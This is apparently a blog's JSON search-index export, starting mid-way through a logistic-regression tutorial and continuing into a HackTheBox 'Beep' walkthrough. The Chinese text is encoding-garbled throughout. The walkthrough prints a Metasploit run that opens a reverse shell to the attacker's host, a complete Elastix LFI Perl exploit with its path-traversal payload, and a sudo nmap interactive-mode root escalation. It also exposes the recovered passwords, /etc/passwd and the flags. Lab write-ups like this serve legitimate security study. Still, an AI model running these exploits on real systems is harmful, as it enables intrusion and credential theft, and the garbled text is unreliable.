&lt; 0æ—¶ï¼Œg(z) &lt; 0.5; åˆz = Î¸Txï¼Œå³ Î¸Tx &gt;= 0æ—¶ï¼Œé¢„æµ‹y=1ï¼Œ Î¸Tx &lt; 0æ—¶ï¼Œé¢„æµ‹y=0 ç°åœ¨å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ¨¡å‹ï¼š å¹¶ä¸”å‚æ•°Î¸æ˜¯å‘é‡[-3 1 1]ã€‚ åˆ™å½“-3 + x1 + x2 &gt;= 0ï¼Œå³x1 + x2 &gt;= 3æ—¶ï¼Œæ¨¡å‹å°†é¢„æµ‹ y = 1 ã€‚ æˆ‘ä»¬å¯ä»¥ç»˜åˆ¶ç›´çº¿x1 + x2 = 3ï¼Œè¿™æ¡çº¿ä¾¿æ˜¯æˆ‘ä»¬æ¨¡å‹çš„åˆ†ç•Œçº¿ï¼Œå°†é¢„æµ‹ä¸º1çš„åŒºåŸŸå’Œé¢„æµ‹ä¸º 0çš„åŒºåŸŸåˆ†éš”å¼€ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œz = Î¸Txåœ¨å‡ ä½•è§’åº¦ä¸­å°±æ˜¯åˆ¤å®šè¾¹ç•Œçš„å‡½æ•°ã€‚å†³ç­–è¾¹ç•Œåªä¸å‚æ•° Î¸ æœ‰å…³ã€‚ 0x03 ä»£ä»·å‡½æ•°(Cost Function) å…¬å¼è¡¨ç¤ºï¼š $$ \\begin{align*}&amp; J(\\theta) = \\dfrac{1}{m} \\sum_{i=1}^m \\mathrm{Cost}(h_\\theta(x{(i)}),y{(i)}) \\newline &amp; \\mathrm{Cost}(h_\\theta(x),y) = -\\log(h_\\theta(x)) ; &amp; \\text{if y = 1} \\newline &amp; \\mathrm{Cost}(h_\\theta(x),y) = -\\log(1-h_\\theta(x)) ; &amp; \\text{if y = 0}\\end{align*} $$ å‡ ä½•æ„ä¹‰ï¼š è¿™æ ·æ„å»ºçš„Cost(hÎ¸(x), y)å‡½æ•°çš„ç‰¹ç‚¹æ˜¯ï¼šå½“å®é™…çš„y =1ä¸” hÎ¸(x) ä¹Ÿä¸º1 æ—¶è¯¯å·®ä¸º 0ï¼Œå½“ y = 1ä½†hÎ¸(x)ä¸ä¸º1æ—¶è¯¯å·®éšç€hÎ¸(x)å˜å°è€Œå˜å¤§ï¼›å½“å®é™…çš„y = 0ä¸”hÎ¸(x)ä¹Ÿä¸º 0 æ—¶ä»£ä»·ä¸º 0ï¼Œå½“y = 0ä½†hÎ¸(x)ä¸ä¸º0æ—¶ï¼Œè¯¯å·®éšç€hÎ¸(x)çš„å˜å¤§è€Œå˜å¤§ã€‚ è¿›ä¸€æ­¥æ•´ç†ä¸€ä¸‹ï¼š $$ \\mathrm{Cost}(h_\\theta(x),y) = - y ; \\log(h_\\theta(x)) - (1 - y) \\log(1 - h_\\theta(x)) $$ å¸¦å…¥ï¼š $$ J(\\theta) = \\dfrac{1}{m} \\sum_{i=1}^m - y^{(i)} ; \\log(h_\\theta(x^{(i)})) - (1 - y^{(i)}) \\log(1 - h_\\theta(x^{(i)})) $$ å‘é‡åŒ–ï¼š $$ \\begin{align*} &amp; h = g(X\\theta)\\newline &amp; J(\\theta) = \\frac{1}{m} \\cdot \\left(-y{T}\\log(h)-(1-y){T}\\log(1-h)\\right) \\end{align*} $$ 0x04 æ¢¯åº¦ä¸‹é™(Gradient Descent) æ¢¯åº¦ä¸‹é™çš„ä¸€èˆ¬å½¢å¼ï¼š $$ \\begin{align*}&amp; Repeat ; \\lbrace \\newline &amp; ; \\theta_j := \\theta_j - \\alpha \\dfrac{\\partial}{\\partial \\theta_j}J(\\theta) \\newline &amp; \\rbrace\\end{align*} $$ ä»£å…¥J(Î¸)ï¼š $$ \\begin{align*} &amp; Repeat ; \\lbrace \\newline &amp; ; \\theta_j := \\theta_j - \\frac{\\alpha}{m} \\sum_{i=1}^m (h_\\theta(x^{(i)}) - y^{(i)}) x_j^{(i)} \\newline &amp; \\rbrace \\end{align*} $$ å¯ä»¥å‘ç°ï¼Œé€»è¾‘å›å½’çš„æ¢¯åº¦ä¸‹é™å’Œçº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™åœ¨å½¢å¼ä¸Šæ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œä½†æ˜¯å‡è®¾å‡½æ•°hÎ¸(x)å‘ç”Ÿäº†å˜åŒ–ã€‚ å‘é‡åŒ–ï¼š $$ \\theta := \\theta - \\frac{\\alpha}{m}X^T(g(X\\theta) - \\vec y) $$ 0x05 å¤šåˆ†ç±»(Muti-classification) å¤„ç†å¤šåˆ†ç±»é—®é¢˜çš„æœ¬è´¨å°±æ˜¯è½¬åŒ–ä¸ºäºŒåˆ†ç±»é—®é¢˜ï¼Œç°åœ¨å‡è®¾æœ‰ä¸‰ä¸ªç±»åˆ«ï¼š ç”¨ä¸‰è§’å½¢è¡¨ç¤ºy = 1 ï¼Œæ–¹æ¡†è¡¨ç¤ºy = 2ï¼Œå‰å‰è¡¨ç¤ºy = 3 ã€‚æˆ‘ä»¬ä¸‹é¢è¦åšçš„å°±æ˜¯ä½¿ç”¨ä¸€ä¸ªè®­ç»ƒé›†ï¼Œå°†å…¶åˆ†æˆ3ä¸ªäºŒå…ƒåˆ†ç±»é—®é¢˜ ä¸ºäº†èƒ½å®ç°è¿™æ ·çš„è½¬å˜ï¼Œæˆ‘ä»¬å°†å¤šä¸ªç±»ä¸­çš„ä¸€ä¸ªç±»æ ‡è®°ä¸ºæ­£å‘ç±»ï¼ˆy = 1ï¼‰ï¼Œç„¶åå°†å…¶ä»–æ‰€æœ‰ç±»éƒ½æ ‡è®°ä¸ºè´Ÿå‘ç±»ï¼Œè¿™ä¸ªæ¨¡å‹è®°ä½œhÎ¸(1) (x)ã€‚æ¥ç€ï¼Œç±»ä¼¼åœ°ç¬¬æˆ‘ä»¬é€‰æ‹©å¦ä¸€ä¸ªç±»æ ‡è®°ä¸ºæ­£å‘ç±»ï¼ˆy = 2ï¼‰ï¼Œå†å°†å…¶å®ƒç±»éƒ½æ ‡è®°ä¸ºè´Ÿå‘ç±»ï¼Œå°†è¿™ä¸ªæ¨¡å‹è®°ä½œ hÎ¸(2) (x)ï¼Œä¾æ­¤ç±»æ¨ã€‚æœ€åï¼Œä¸ºäº†åšå‡ºé¢„æµ‹ï¼Œæˆ‘ä»¬ç»™å‡ºè¾“å…¥ä¸€ä¸ªæ–°çš„xå€¼ï¼Œç”¨è¿™ä¸ªåšé¢„æµ‹ã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯åœ¨æˆ‘ä»¬ä¸‰ä¸ªåˆ†ç±»å™¨é‡Œé¢è¾“å…¥x ï¼Œç„¶åæˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªè®© hÎ¸(i) (x)æœ€å¤§çš„iï¼Œå³ï¼š $$ \\arg\\max_\\theta h_{\\theta}^{(i)} $$ 0x06 æ­£åˆ™åŒ–(Regularization) æ‰€è°“æ­£åˆ™åŒ–ï¼Œå°±æ˜¯ä¸ºäº†é˜²æ­¢å‡ºç°è¿‡æ‹Ÿåˆè€Œå¯¹æŸäº›Î¸å‚æ•°å¼•å…¥æƒ©ç½šå› å­ï¼Œè¿™æ ·åšçš„è¯ï¼Œæˆ‘ä»¬åœ¨å°è¯•æœ€å°åŒ–ä»£ä»·æ—¶ä¹Ÿéœ€è¦å°†è¿™ä¸ªæƒ©ç½šçº³å…¥è€ƒè™‘ä¸­ï¼Œå¹¶æœ€ç»ˆå¯¼è‡´é€‰æ‹©è¾ƒå°ä¸€äº›çš„Î¸ã€‚ æ¯”å¦‚å›å½’é—®é¢˜ä¸­å¦‚æœæˆ‘ä»¬çš„å‡è®¾å‡½æ•°æ˜¯ï¼š $$ h_\\theta (x) = \\theta_0 + \\theta_1 x_1 + \\theta_2 x_2^2 + \\theta_3 x_3^3 + \\theta_4 x_4^4 $$ æˆ‘ä»¬æƒ³å¯¹Î¸3å’ŒÎ¸4è®¾ç½®ä¸€ç‚¹æƒ©ç½šï¼Œä¿®æ”¹åçš„ä»£ä»·å‡½æ•°ä¸ºï¼š $$ min_\\theta \\frac{1}{2m}[\\sum_{i=1}{m}(h_\\theta(x{(i)})-y{(i)})2 + 1000\\theta_3^2 + 1000\\theta_4^2] $$ å‡å¦‚æˆ‘ä»¬æœ‰éå¸¸å¤šçš„ç‰¹å¾ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“å…¶ä¸­å“ªäº›ç‰¹å¾æˆ‘ä»¬è¦æƒ©ç½šï¼Œæˆ‘ä»¬å°†å¯¹æ‰€æœ‰çš„ç‰¹å¾è¿›è¡Œæƒ©ç½šï¼Œå¹¶ä¸”è®©ä»£ä»·å‡½æ•°æœ€ä¼˜åŒ–çš„è½¯ä»¶æ¥é€‰æ‹©è¿™äº›æƒ©ç½šçš„ç¨‹åº¦ã€‚è¿™æ ·çš„ç»“æœæ˜¯å¾—åˆ°äº†ä¸€ä¸ªè¾ƒä¸ºç®€å•çš„èƒ½é˜²æ­¢è¿‡æ‹Ÿåˆé—®é¢˜çš„å‡è®¾ï¼š $$ min_\\theta \\frac{1}{2m}[\\sum_{i=1}{m}(h_\\theta(x{(i)})-y{(i)})2 + \\lambda\\sum_{i=1}m\\theta_j2] $$ å…¶ä¸­Î»åˆç§°ä¸ºæ­£åˆ™åŒ–å‚æ•°ï¼ˆRegularization Parameterï¼‰ã€‚ æ­£åˆ™åŒ–çº¿æ€§å›å½’ $$ \\begin{align*} &amp; \\text{Repeat}\\ \\lbrace \\newline &amp; \\ \\ \\ \\ \\theta_0 := \\theta_0 - \\alpha\\ \\frac{1}{m}\\ \\sum_{i=1}^m (h_\\theta(x^{(i)}) - y{(i)})x_0{(i)} \\newline &amp; \\ \\ \\ \\ \\theta_j := \\theta_j - \\alpha\\ \\left[ \\left( \\frac{1}{m}\\ \\sum_{i=1}^m (h_\\theta(x^{(i)}) - y{(i)})x_j{(i)} \\right) + \\frac{\\lambda}{m}\\theta_j \\right] &amp;\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ j \\in \\lbrace 1,2â€¦n\\rbrace\\newline &amp; \\rbrace \\end{align*} $$ æ­£è§„æ–¹ç¨‹æ±‚è§£æ­£åˆ™åŒ–çº¿æ€§å›å½’ $$ \\begin{align*}&amp; \\theta = \\left( X^TX + \\lambda \\cdot L \\right)^{-1} X^Ty \\newline&amp; \\text{where}\\ \\ L = \\begin{bmatrix} 0 &amp; &amp; &amp; &amp; \\newline &amp; 1 &amp; &amp; &amp; \\newline &amp; &amp; 1 &amp; &amp; \\newline &amp; &amp; &amp; \\ddots &amp; \\newline &amp; &amp; &amp; &amp; 1 \\newline\\end{bmatrix}\\end{align*} $$ æ­£åˆ™åŒ–é€»è¾‘å›å½’ åŒæ ·å¯¹äºé€»è¾‘å›å½’ï¼Œæˆ‘ä»¬ä¹Ÿç»™ä»£ä»·å‡½æ•°å¢åŠ ä¸€ä¸ªæ­£åˆ™åŒ–çš„è¡¨è¾¾å¼ï¼Œå¾—åˆ°ä»£ä»·å‡½æ•°ï¼š $$ J(\\theta) = -\\dfrac{1}{m} \\sum_{i=1}^m [y^{(i)} ; \\log(h_\\theta(x^{(i)})) + (1 - y^{(i)}) \\log(1 - h_\\theta(x^{(i)}))] + \\frac{\\lambda}{2m}\\sum_{j=1}^n \\theta_j^2 $$","tags":[{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"é€»è¾‘å›å½’","slug":"é€»è¾‘å›å½’","permalink":"http://ca0y1h.top/tags/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"}],"categories":[{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"åŸºç¡€å…¥é—¨","slug":"æœºå™¨å­¦ä¹ /åŸºç¡€å…¥é—¨","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"HTB:Beep-walkthrough","date":"2020-04-07T15:14:59.000Z","path":"Target_drone/HackTheBox/13.HTB-Beep-walkthrough/","text":"HTB::Beep Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap sslscan wfuzz vtigercrm LFI Elastix / FreeFBX Nmap Privilege Escalation 0x03 Pentesting Initial Enumeration ç«¯å£æ‰«æ 12345678910111213141516171819202122232425262728293031323334353637# Nmap 7.80 scan initiated Tue Apr 7 03:18:33 2020 as: nmap -sC -sV -Pn -oN ippsec_scan.txt 10.10.10.7Nmap scan report for 10.10.10.7Host is up (0.25s latency).Not shown: 987 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 4.3 (protocol 2.0)| ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)|_ 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)25&#x2F;tcp open smtp Postfix smtpd|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 80&#x2F;tcp open http Apache httpd 2.2.3|_http-server-header: Apache&#x2F;2.2.3 (CentOS)|_http-title: Did not follow redirect to https:&#x2F;&#x2F;10.10.10.7&#x2F;|_https-redirect: ERROR: Script execution failed (use -d to debug)110&#x2F;tcp open pop3 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4|_pop3-capabilities: TOP APOP UIDL IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) STLS RESP-CODES AUTH-RESP-CODE USER EXPIRE(NEVER) PIPELINING111&#x2F;tcp open rpcbind 2 (RPC #100000)143&#x2F;tcp open imap Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4|_imap-capabilities: THREAD&#x3D;REFERENCES ATOMIC Completed MAILBOX-REFERRALS OK RENAME LISTEXT LITERAL+ MULTIAPPEND X-NETSCAPE LIST-SUBSCRIBED CHILDREN UNSELECT RIGHTS&#x3D;kxte URLAUTHA0001 IDLE IMAP4rev1 SORT&#x3D;MODSEQ ID BINARY IMAP4 CONDSTORE CATENATE SORT ANNOTATEMORE NO UIDPLUS STARTTLS ACL NAMESPACE THREAD&#x3D;ORDEREDSUBJECT QUOTA443&#x2F;tcp open ssl&#x2F;https?|_ssl-date: 2020-04-07T07:23:36+00:00; +1m25s from scanner time.880&#x2F;tcp open status 1 (RPC #100024)993&#x2F;tcp open ssl&#x2F;imap Cyrus imapd|_imap-capabilities: CAPABILITY995&#x2F;tcp open pop3 Cyrus pop3d3306&#x2F;tcp open mysql MySQL (unauthorized)4445&#x2F;tcp open upnotifyp?10000&#x2F;tcp open http MiniServ 1.570 (Webmin httpd)|_http-title: Site doesn&#39;t have a title (text&#x2F;html; Charset&#x3D;iso-8859-1).Service Info: Hosts: beep.localdomain, 127.0.0.1, example.comHost script results:|_clock-skew: 1m24sService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .# Nmap done at Tue Apr 7 03:24:47 2020 -- 1 IP address (1 host up) scanned in 374.24 seconds SSL scan 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [4:37:19] C:127$ sslscan 10.10.10.7Version: 2.0.0-staticOpenSSL 1.1.1f-dev xx XXX xxxxConnected to 10.10.10.7Testing SSL server 10.10.10.7 on port 443 using SNI name 10.10.10.7 SSL&#x2F;TLS Protocols:SSLv2 disabledSSLv3 enabledTLSv1.0 enabledTLSv1.1 disabled TLSv1.2 disabledTLSv1.3 disabled TLS Fallback SCSV:Server does not support TLS Fallback SCSV TLS renegotiation:Secure session renegotiation supported TLS Compression:Compression enabled (CRIME) Heartbleed:TLSv1.0 not vulnerable to heartbleed Supported Server Cipher(s):Preferred TLSv1.0 256 bits DHE-RSA-AES256-SHA DHE 1024 bitsAccepted TLSv1.0 128 bits DHE-RSA-AES128-SHA DHE 1024 bitsAccepted TLSv1.0 112 bits DHE-RSA-DES-CBC3-SHA DHE 1024 bitsAccepted TLSv1.0 256 bits AES256-SHA Accepted TLSv1.0 128 bits AES128-SHA Accepted TLSv1.0 128 bits RC4-SHAAccepted TLSv1.0 112 bits DES-CBC3-SHA Accepted TLSv1.0 56 bits TLS_RSA_WITH_DES_CBC_SHA Accepted TLSv1.0 56 bits TLS_DHE_RSA_WITH_DES_CBC_SHA Server Signature Algorithm(s):TLSv1.0 Server accepts all signature algorithms. SSL Certificate:Signature Algorithm: sha1WithRSAEncryptionRSA Key Strength: 1024Subject: localhost.localdomainIssuer: localhost.localdomainNot valid before: Apr 7 08:22:08 2017 GMTNot valid after: Apr 7 08:22:08 2018 GMT wfuzzæ‰«æç›®å½• Getting User Access å¯»æ‰¾vtigercrm v5.1.0çš„æ¼æ´ å°è¯•``vtiger_php_execä¸è¡Œå†æ¢vtiger_soap_upload`ï¼Œå¯ä»¥åå¼¹shell 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950msf5 exploit(multi&#x2F;http&#x2F;vtiger_php_exec) &gt; use exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_uploadmsf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; show optionsModule options (exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_upload): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL&#x2F;TLS for outgoing connections TARGETURI &#x2F;vtigercrm&#x2F; yes Base vTiger CRM directory path VHOST no HTTP server virtual hostExploit target: Id Name -- ---- 0 vTigerCRM v5.4.0msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set RHOSTS 10.10.10.7RHOSTS &#x3D;&gt; 10.10.10.7msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set RPORT 443RPORT &#x3D;&gt; 443msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set SSL trueSSL &#x3D;&gt; truemsf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set LHOST 10.10.14.5LHOST &#x3D;&gt; 10.10.14.5msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; check[+] 10.10.10.7:443 - The target is vulnerable.msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; exploit [*] Started reverse TCP handler on 10.10.14.5:4444 [*] Uploading payload...[+] Upload successfully uploaded[*] Executing payload...[*] Sending stage (38288 bytes) to 10.10.10.7[*] Meterpreter session 1 opened (10.10.14.5:4444 -&gt; 10.10.10.7:43989) at 2020-04-07 10:50:50 -0400[!] This exploit may require manual cleanup of &#39;bPRojImibS.php&#39; on the targetmeterpreter &gt; [+] Deleted bPRojImibS.phpshellProcess 8916 created.Channel 0 created.iduid&#x3D;100(asterisk) gid&#x3D;101(asterisk) groups&#x3D;101(asterisk) è·å–user flag 12345678910111213141516171819202122python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;sh&#39;)&quot; sh-3.2$ ididuid&#x3D;100(asterisk) gid&#x3D;101(asterisk) groups&#x3D;101(asterisk)sh-3.2$ pwdpwd&#x2F;var&#x2F;www&#x2F;html&#x2F;vtigercrmsh-3.2$ cd &#x2F;home&#x2F;faniscd &#x2F;home&#x2F;fanissh-3.2$ ls -lals -latotal 32drwxrwxr-x 2 fanis fanis 4096 Apr 7 2017 .drwxr-xr-x 4 root root 4096 Apr 7 2017 ..-rw------- 1 fanis fanis 114 Apr 7 2017 .bash_history-rw-r--r-- 1 fanis fanis 33 Apr 7 2017 .bash_logout-rw-r--r-- 1 fanis fanis 176 Apr 7 2017 .bash_profile-rw-r--r-- 1 fanis fanis 124 Apr 7 2017 .bashrc-rw-rw-r-- 1 fanis fanis 33 Apr 7 2017 user.txtsh-3.2$ cat user.txtcat user.txtaeff3def0c765c2677b94715cffa73ac Getting Root Access ææƒ 123456789101112131415161718192021222324sh-3.2$ sudo -lsudo -lMatching Defaults entries for asterisk on this host: env_reset, env_keep&#x3D;&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;User asterisk may run the following commands on this host: (root) NOPASSWD: &#x2F;sbin&#x2F;shutdown (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;nmap (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;yum (root) NOPASSWD: &#x2F;bin&#x2F;touch (root) NOPASSWD: &#x2F;bin&#x2F;chmod (root) NOPASSWD: &#x2F;bin&#x2F;chown (root) NOPASSWD: &#x2F;sbin&#x2F;service (root) NOPASSWD: &#x2F;sbin&#x2F;init (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;postmap (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;postfix (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;saslpasswd2 (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;hardware_detector (root) NOPASSWD: &#x2F;sbin&#x2F;chkconfig (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;elastix-helper å‘½ä¸­Nmapï¼Œä»¥rootæƒé™æ‰§è¡Œä¸”æ— éœ€è®¤è¯ è¾ƒæ—©ç‰ˆæœ¬çš„Nmapï¼ˆ2.02è‡³5.21ï¼‰å…·æœ‰äº¤äº’æ¨¡å¼ï¼Œè¯¥æ¨¡å¼å…è®¸ç”¨æˆ·æ‰§è¡ŒShellå‘½ä»¤ç”±äºNmapåœ¨ä»¥rootç‰¹æƒæ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶åˆ—è¡¨ä¸­ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨äº¤äº’å¼æ§åˆ¶å°æ¥ä»¥ç›¸åŒçš„ç‰¹æƒè¿è¡Œshell 12345678910111213sh-3.2$ sudo nmap --interactivesudo nmap --interactiveStarting Nmap V. 4.11 ( http:&#x2F;&#x2F;www.insecure.org&#x2F;nmap&#x2F; )Welcome to Interactive Mode -- press h &lt;enter&gt; for helpnmap&gt; !sh!shsh-3.2# whoamiwhoamirootsh-3.2# cat &#x2F;root&#x2F;root.txtcat &#x2F;root&#x2F;root.txtd88e006123842106982acce0aaf453f0 Another Way é‡ç‚¹å…³æ³¨å‡ ä¸ªå¸¸è§æœåŠ¡ 22(ssh)ã€80(apache)ã€443(https)ã€3306(mysql)ã€10000(httpd)ï¼Œè®¿é—® https://10.10.10.7:443 ï¼Œè¿”å›ç™»å½•é¡µé¢ï¼š ä½¿ç”¨é»˜è®¤ç™»å½•å¯†ç ï¼šusername: admin password: palosantoï¼Œç™»å½•é”™è¯¯ã€‚ searchsploitæ‰¾ä¸€ä¸‹ç›¸å…³æ¼æ´ï¼š å°è¯•æœ¬åœ°åŒ…å«æ¼æ´ï¼Œå› ä¸ºé¶æœºä¸Šçš„SSLè¯ä¹¦è¿‡æœŸäº†ï¼Œæ‰€ä»¥è¦ä¿®æ”¹ä¸€ä¸‹åˆ©ç”¨è„šæœ¬ï¼š https://stackoverflow.com/questions/336575/can-i-force-lwpuseragent-to-accept-an-expired-ssl-certificate 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/perl -w#------------------------------------------------------------------------------------#Elastix is an Open Source Sofware to establish Unified Communications. #About this concept, Elastix goal is to incorporate all the communication alternatives, #available at an enterprise level, into a unique solution. #------------------------------------------------------------------------------------############################################################ # Exploit Title: Elastix 2.2.0 LFI # Google Dork: :( # Author: cheki # Version:Elastix 2.2.0# Tested on: multiple# CVE : notyet# romanc-_-eyes ;) # Discovered by romanc-_-eyes# vendor http://www.elastix.org/print &quot;\\t Elastix 2.2.0 LFI Exploit \\n&quot;;print &quot;\\t code author cheki \\n&quot;;print &quot;\\t 0day Elastix 2.2.0 \\n&quot;;print &quot;\\t email: anonymous17hacker&#123;&#125;gmail.com \\n&quot;;#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;actionuse LWP::UserAgent;print &quot;\\n Target: https://ip &quot;;chomp(my $target=&lt;STDIN&gt;);$dir=&quot;vtigercrm&quot;;$poc=&quot;current_language&quot;;$etc=&quot;etc&quot;;$jump=&quot;../../../../../../../..//&quot;;$test=&quot;amportal.conf%00&quot;;$code = LWP::UserAgent-&gt;new() or die &quot;inicializacia brauzeris\\n&quot;;$code-&gt;ssl_opts(verify_hostname =&gt; 0, SSL_verify_mode =&gt; 0x00);$code-&gt;agent(&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#x27;);$host = $target . &quot;/&quot;.$dir.&quot;/graph.php?&quot;.$poc.&quot;=&quot;.$jump.&quot;&quot;.$etc.&quot;/&quot;.$test.&quot;&amp;module=Accounts&amp;action&quot;;$res = $code-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));$answer = $res-&gt;content; if ($answer =~ &#x27;This file is part of FreePBX&#x27;) &#123; print &quot;\\n read amportal.conf file : $answer \\n\\n&quot;;print &quot; successful read\\n&quot;; &#125;else &#123; print &quot;\\n[-] not successful\\n&quot;; &#125; ä»ä¹‹å‰ sslscan çš„æ‰«æç»“æœæˆ‘ä»¬çœ‹åˆ°é¶æœºåªæ”¯æŒ TLSv1.0ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¿®æ”¹ Kali çš„opensslé…ç½®æ–‡ä»¶ 123456[system_default_sect]#MinProtocol &#x3D; TLSv1.2#CipherString &#x3D; DEFAULT@SECLEVEL&#x3D;2MinProtocol &#x3D; TLSv1.0CipherString &#x3D; DEFAUT å†æ‰§è¡Œåˆ©ç”¨è„šæœ¬ 12345678910111213141516# kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [5:15:57]$ perl 37637.pl &gt; elastix# kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [5:16:34]$ cat elastix...AMPDBHOST&#x3D;localhostAMPDBENGINE&#x3D;mysql# AMPDBNAME&#x3D;asteriskAMPDBUSER&#x3D;asteriskuser# AMPDBPASS&#x3D;amp109AMPDBPASS&#x3D;jEhdIekWmdjEAMPENGINE&#x3D;asteriskAMPMGRUSER&#x3D;admin#AMPMGRPASS&#x3D;amp111AMPMGRPASS&#x3D;jEhdIekWmdjE... åˆ©ç”¨payloadç›´æ¥åœ¨ç½‘é¡µä¸ŠæŸ¥çœ‹/etc/passwd 123456789101112131415161718192021222324252627282930313233343536root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashbin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologindaemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologinadm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologinlp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologinsync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;syncshutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdownhalt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;haltmail:x:8:12:mail:&#x2F;var&#x2F;spool&#x2F;mail:&#x2F;sbin&#x2F;nologinnews:x:9:13:news:&#x2F;etc&#x2F;news:uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;sbin&#x2F;nologinoperator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologingames:x:12:100:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologingopher:x:13:30:gopher:&#x2F;var&#x2F;gopher:&#x2F;sbin&#x2F;nologinftp:x:14:50:FTP User:&#x2F;var&#x2F;ftp:&#x2F;sbin&#x2F;nologinnobody:x:99:99:Nobody:&#x2F;:&#x2F;sbin&#x2F;nologinmysql:x:27:27:MySQL Server:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;bin&#x2F;bashdistcache:x:94:94:Distcache:&#x2F;:&#x2F;sbin&#x2F;nologinvcsa:x:69:69:virtual console memory owner:&#x2F;dev:&#x2F;sbin&#x2F;nologinpcap:x:77:77::&#x2F;var&#x2F;arpwatch:&#x2F;sbin&#x2F;nologinntp:x:38:38::&#x2F;etc&#x2F;ntp:&#x2F;sbin&#x2F;nologincyrus:x:76:12:Cyrus IMAP Server:&#x2F;var&#x2F;lib&#x2F;imap:&#x2F;bin&#x2F;bashdbus:x:81:81:System message bus:&#x2F;:&#x2F;sbin&#x2F;nologinapache:x:48:48:Apache:&#x2F;var&#x2F;www:&#x2F;sbin&#x2F;nologinmailman:x:41:41:GNU Mailing List Manager:&#x2F;usr&#x2F;lib&#x2F;mailman:&#x2F;sbin&#x2F;nologinrpc:x:32:32:Portmapper RPC 